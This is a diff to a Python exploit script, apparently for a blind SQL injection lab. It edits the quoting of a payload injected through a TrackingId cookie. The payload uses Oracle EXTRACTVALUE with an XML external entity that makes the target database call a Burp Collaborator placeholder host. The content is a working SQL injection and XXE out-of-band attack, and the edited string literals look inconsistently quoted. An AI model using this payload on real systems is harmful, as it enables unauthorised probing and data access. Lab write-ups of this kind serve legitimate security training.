@@ -32,10 +32,10 @@ def main(args):
     log.info(f"TrackingId: {tracking_id}")
     exploit = (
           f"{tracking_id}'+UNION SELECT EXTRACTVALUE(xmltype('
-          <?xml version="1.0" encoding="UTF-8"?>
-          <!DOCTYPE root [ <!ENTITY % remote SYSTEM 
-          "http://BURP-COLLABORATOR-SUBDOMAIN/">
-          %remote;]>'),'/l') FROM dual--
+          '<?xml version="1.0" encoding="UTF-8"?>'
+          "<!DOCTYPE root [ <!ENTITY % remote SYSTEM" 
+          f"\"http://BURP-COLLABORATOR-SUBDOMAIN/">"
+          " %remote;]>'),'/l') FROM dual-- "
 )    
     exploit_encoded = urllib.parse.quote(exploit)
     cookies = {
